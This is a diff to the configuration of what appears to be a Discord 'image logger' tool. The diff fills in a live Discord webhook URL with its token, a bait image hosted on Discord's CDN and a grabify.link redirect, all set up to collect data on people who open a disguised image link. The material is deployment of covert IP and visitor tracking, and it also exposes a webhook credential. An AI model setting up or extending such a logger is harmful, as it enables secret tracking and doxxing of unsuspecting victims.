@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1223048557578162256/boaFISy_06xK_27noX6naxPjhPJOq0C5Y1V56rPoLiSqEJVxgLksWJS2jdXSU1gKJJ1K",
+    "image": "https://cdn.discordapp.com/attachments/1201888919340466196/1223048283941900339/ifixeddhfie_00003.jpg?ex=66186f7a&is=6605fa7a&hm=4329b67e1d9492b0337069a8fc8eb9f3cb9d1a44d0de81072c352076bb4826d5&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "page": "https://grabify.link/LOL5CP" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
